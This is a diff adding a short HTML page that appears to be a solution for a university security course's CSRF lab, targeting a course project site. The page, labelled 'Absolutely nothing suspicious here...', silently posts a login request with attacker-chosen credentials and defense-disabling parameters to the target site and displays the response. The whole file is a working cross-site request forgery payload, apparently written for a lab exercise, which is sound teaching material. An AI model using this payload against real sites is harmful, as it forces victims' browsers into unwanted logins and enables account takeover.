@@ -1,0 +1,14 @@
+<html>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <span id="foo">Absolutely nothing suspicious here...</span>
+    <iframe src="https://project2.ecen4133.org">
+        <script>
+            console.log("redirecting...");
+            $(function() {
+                $.post("https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4&username=attacker&password=l33th4x", function (data) {
+                    $('#foo').html(data);
+                });
+            });
+        </script>
+    </iframe>
+</html>
